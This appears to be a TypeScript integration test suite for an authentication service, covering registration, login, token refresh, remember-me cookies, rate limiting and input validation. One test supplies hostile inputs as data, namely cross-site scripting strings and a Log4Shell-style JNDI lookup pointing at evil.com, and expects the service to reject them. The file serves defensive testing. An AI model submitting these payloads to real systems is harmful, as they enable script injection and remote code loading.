import request from 'supertest';

const AUTH_SERVICE_URL: string = process.env.AUTH_SERVICE_URL!;

const makeRequest = (app: any) => {
  return {
    post: (path: string) => request(app).post(path).set('x-test-rate-limit', 'true'),
    get: (path: string) => request(app).get(path).set('x-test-rate-limit', 'true'),
    put: (path: string) => request(app).put(path).set('x-test-rate-limit', 'true'),
    delete: (path: string) => request(app).delete(path).set('x-test-rate-limit', 'true')
  };
};

interface User {
  id: string;
  email: string;
  firstName: string;
  lastName: string;
  phoneNumber?: string;
}

describe('Auth Service Integration Tests', () => {
  let testUser: User | undefined;
  let accessToken: string | undefined;
  let refreshTokenCookie: string | undefined;
  const authURL: string = AUTH_SERVICE_URL;

  beforeAll(async () => {
    try {
      await makeRequest(authURL).post('/test/reset').expect(200);
    } catch (error) {
      console.warn('Test reset endpoint not available, continuing...');
    }
  });

  afterEach(async () => {
    try {
      if (testUser?.email) {
        await makeRequest(authURL)
          .post('/test/cleanup')
          .send();
        await makeRequest(authURL)
          .delete(`/test/users/${testUser.email}`)
          .send();
      }
    } catch (error) {
    }
  });

  describe('Complete Auth Flow', () => {
    it('should complete full registration -> login -> profile -> logout flow', async () => {
      const registrationData = {
        email: `integration-${Date.now()}@test.com`,
        password: 'Password123!',
        firstName: 'Integration',
        lastName: 'Test',
      };

      const registerResponse = await request(authURL)
        .post('/register')
        .send(registrationData)
        .expect(201);

      expect(registerResponse.body.success).toBe(true);
      expect(registerResponse.body.data.user.email).toBe(registrationData.email);

      const setCookieHeader = registerResponse.headers['set-cookie'];
      refreshTokenCookie = Array.isArray(setCookieHeader) 
        ? setCookieHeader.find(cookie => cookie.startsWith('refreshToken='))
        : setCookieHeader?.startsWith('refreshToken=') ? setCookieHeader : undefined;

      accessToken = registerResponse.body.data.tokens.accessToken;
      testUser = registerResponse.body.data.user;

      const profileResponse = await request(authURL)
        .get('/profile')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      expect(profileResponse.body.data.user.email).toBe(registrationData.email);

      const updateData = {
        firstName: 'UpdatedName',
        phoneNumber: '+1234567890',
      };

      const updateResponse = await request(authURL)
        .put('/profile')
        .set('Authorization', `Bearer ${accessToken}`)
        .send(updateData)
        .expect(200);

      expect(updateResponse.body.data.user.firstName).toBe('UpdatedName');
      expect(updateResponse.body.data.user.phoneNumber).toBe('+1234567890');

      const changePasswordResponse = await request(authURL)
        .post('/change-password')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          currentPassword: 'Password123!',
          newPassword: 'NewPassword123!',
        })
        .expect(200);

      expect(changePasswordResponse.body.success).toBe(true);

      const loginResponse = await request(authURL)
        .post('/login')
        .send({
          email: registrationData.email,
          password: 'NewPassword123!',
        })
        .expect(200);

      expect(loginResponse.body.success).toBe(true);

      const newAccessToken = loginResponse.body.data.tokens.accessToken;
      const newRefreshCookie = loginResponse.headers['set-cookie'];
      const cookieValue = Array.isArray(newRefreshCookie)
        ? newRefreshCookie.find(cookie => cookie.startsWith('refreshToken='))
        : newRefreshCookie?.startsWith('refreshToken=') ? newRefreshCookie : undefined;

      const logoutResponse = await request(authURL)
        .post('/logout')
        .set('Cookie', cookieValue as string)
        .set('Authorization', `Bearer ${newAccessToken}`)
        .expect(200);

      expect(logoutResponse.body.success).toBe(true);

      await request(authURL)
        .get('/profile')
        .set('Authorization', `Bearer ${newAccessToken}`)
        .expect(401);
    }, 30000);

    it('should handle refresh token flow correctly', async () => {
      const userData = {
        email: `refresh-${Date.now()}@test.com`,
        password: 'Password123!',
        firstName: 'Refresh',
        lastName: 'User',
      };
    
      const registerResponse = await request(authURL)
        .post('/register')
        .send(userData)
        .expect(201);
    
      testUser = registerResponse.body.data.user;
    
      const initialRefreshCookie = registerResponse.headers['set-cookie'];
      const cookieHeader = Array.isArray(initialRefreshCookie)
        ? initialRefreshCookie.find(cookie => cookie.startsWith('refreshToken='))
        : initialRefreshCookie?.startsWith('refreshToken=') ? initialRefreshCookie : undefined;
    
      const refreshTokenValue = cookieHeader?.match(/refreshToken=([^;]+)/)?.[1];
      console.log('Original refresh token:', refreshTokenValue?.substring(0, 20) + '...');
    
      const refreshResponse = await request(authURL)
        .post('/refresh')
        .send({ refreshToken: refreshTokenValue })
        .expect(200);
    
      console.log('First refresh successful');
    
      console.log('Attempting second refresh with same token...');
      const secondRefreshResponse = await request(authURL)
        .post('/refresh')
        .send({ refreshToken: refreshTokenValue });
    
      console.log('Second refresh status:', secondRefreshResponse.status);
      console.log('Second refresh body:', secondRefreshResponse.body);
    
      expect(secondRefreshResponse.status).toBe(401);
    }, 20000);

    it('should handle remember me functionality', async () => {
      const userData = {
        email: `remember-${Date.now()}@test.com`,
        password: 'Password123!',
        firstName: 'Remember',
        lastName: 'User',
      };

      const registerResponse = await request(authURL)
        .post('/register')
        .send(userData)
        .expect(201);

      testUser = registerResponse.body.data.user;

      const loginData = {
        email: userData.email,
        password: userData.password,
        rememberMe: true,
      };

      const loginResponse = await request(authURL)
        .post('/login')
        .send(loginData)
        .expect(200);

      const refreshCookie = loginResponse.headers['set-cookie'];
      const refreshCookieStr = Array.isArray(refreshCookie)
        ? refreshCookie.find(cookie => cookie.startsWith('refreshToken='))
        : refreshCookie?.startsWith('refreshToken=') ? refreshCookie : undefined;

      expect(refreshCookieStr).toContain('Max-Age=2592000');

      const shortLoginResponse = await request(authURL)
        .post('/login')
        .send({ ...loginData, rememberMe: false })
        .expect(200);

      const shortRefreshCookie = shortLoginResponse.headers['set-cookie'];
      const shortRefreshCookieStr = Array.isArray(shortRefreshCookie)
        ? shortRefreshCookie.find(cookie => cookie.startsWith('refreshToken='))
        : shortRefreshCookie?.startsWith('refreshToken=') ? shortRefreshCookie : undefined;

      expect(shortRefreshCookieStr).toContain('Max-Age=604800');
    }, 15000);
  });

  describe('Security Tests', () => {
    it('should reject requests with malformed tokens', async () => {
      const malformedTokens = [
        'Bearer invalid.token.format',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        'Bearer not-even-close',
        'Bearer ',
        ''
      ];

      for (const token of malformedTokens) {
        await makeRequest(authURL)
          .get('/profile')
          .set('Authorization', token)
          .expect(401);
      }
    }, 15000);

    it('should validate input sanitization', async () => {
      const maliciousInputs = {
        email: '<script>alert("xss")</script>@test.com',
        firstName: '<img src=x onerror=alert("xss")>',
        lastName: '${jndi:ldap://evil.com/a}',
        phoneNumber: '+1<script>alert("xss")</script>',
        password: 'ValidPass123!'
      };

      await request(authURL)
        .post('/register')
        .send(maliciousInputs)
        .expect(400);
    }, 10000);

    it('should enforce rate limiting', async () => {
      const requests = [];
      const testEmail = `ratelimit-${Date.now()}@test.com`;
      
      for (let i = 0; i < 10; i++) {
        requests.push(
          request(authURL)
            .post('/login')
            .set('x-test-rate-limit', 'true')
            .send({
              email: testEmail,
              password: 'wrongpassword'
            })
        );
      }
    
      const responses = await Promise.all(requests);
      
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    }, 15000);

    it('should handle duplicate email registration', async () => {
      const userData = {
        email: `duplicate-${Date.now()}@test.com`,
        password: 'Password123!',
        firstName: 'Duplicate',
        lastName: 'User',
      };

      const registerResponse1 = await request(authURL)
        .post('/register')
        .send(userData)
        .expect(201);

      testUser = registerResponse1.body.data.user;

      await request(authURL)
        .post('/register')
        .send(userData)
        .expect(409); 
    }, 10000);

    it('should validate password requirements', async () => {
      const weakPasswords = [
        'weak',
        '123456',
        'password',
        'Pass123', 
        'password123!', 
        'PASSWORD123!', 
      ];

      for (const password of weakPasswords) {
        await request(authURL)
          .post('/register')
          .send({
            email: `test${Date.now()}${Math.random()}@test.com`,
            password: password,
            firstName: 'Test',
            lastName: 'User'
          })
          .expect(400);
      }
    }, 15000);
  });

  describe('Error Handling', () => {
    it('should handle invalid login credentials', async () => {
      await makeRequest(authURL)
        .post('/login')
        .send({
          email: `nonexistent-${Date.now()}@test.com`,
          password: 'wrongpassword'
        })
        .expect(401);
    });

    it('should handle missing required fields', async () => {
      await request(authURL)
        .post('/register')
        .send({
          password: 'Password123!',
          firstName: 'Test',
          lastName: 'User'
        })
        .expect(400);

      await request(authURL)
        .post('/login')
        .send({
          email: 'test@test.com'
        })
        .expect(400);
    });

    it('should handle expired or invalid refresh tokens', async () => {
      await makeRequest(authURL)
        .post('/refresh')
        .set('Cookie', 'refreshToken=invalid-token')
        .expect(401);
    });
  });
});